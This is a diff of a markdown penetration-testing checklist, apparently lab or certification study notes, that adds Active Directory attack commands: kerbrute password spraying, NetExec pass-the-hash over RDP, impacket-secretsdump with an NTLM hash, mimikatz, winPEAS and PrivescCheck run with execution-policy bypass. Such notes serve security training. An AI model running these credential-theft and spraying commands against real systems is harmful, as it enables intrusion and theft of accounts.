@@ -11,8 +11,6 @@
 * [ ] nmap scan of internal network
 * [ ] smb shares
 
-
-
 ## Windows Privilege Escalation
 
 {% embed url="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" %}
@@ -46,6 +44,12 @@
 
 ## Harvested Domain Credential
 
+### Kerbrute
+
+* ```shell-session
+  $ proxychains kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+  ```
+
 ### Kerberoast
 
 * ```shell-session
@@ -60,6 +64,13 @@
 
 
 
+## Harvest new Hash
+
+* [ ] Check with crackstation
+* ```shell-session
+  $ NetExec rdp 192.168.215.175 -u users.txt -H hashes.txt
+  ```
+
 ## Harvested a new Private Key
 
 ### Spray Intranet (.ssh)
@@ -70,20 +81,30 @@ If we have a shell on a box and notice a user has a private key in their home di
   victim@host$ ssh -i id_rsa mario@172.16.233.14
   ```
 
+##
+
 ## Popped a new Shell
 
-#### Enumerate
+#### Automated Enumeration
 
-* <pre><code><strong>$ .\winPEASx64.exe
+* <pre class="language-powershell"><code class="lang-powershell"><strong>PS> .\winPEASx64.exe
   </strong></code></pre>
+* ```powershell
+  PS> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+  ```
+
+**Manual Enumeration**
+
+* [ ] Check for sensitive files
+* [ ] Check for potential binary hijacking
+* [ ] Check for scheduled tasks / services running under other users.
 
 #### (PWNED) - Dump Secrets
 
 * <pre class="language-shell"><code class="lang-shell"><strong>$ proxychains impacket-secretsdump -hashes ":e728ecbadfb02f51ce8eed753f3ff3fd" celia.almeda@10.10.85.142
   </strong></code></pre>
-* ```powershell
-  $ mimikatz
-  ```
+* <pre class="language-powershell"><code class="lang-powershell"><strong>PS> .\mimikatz.exe
+  </strong></code></pre>
 
 ## Privilege Escalation
 
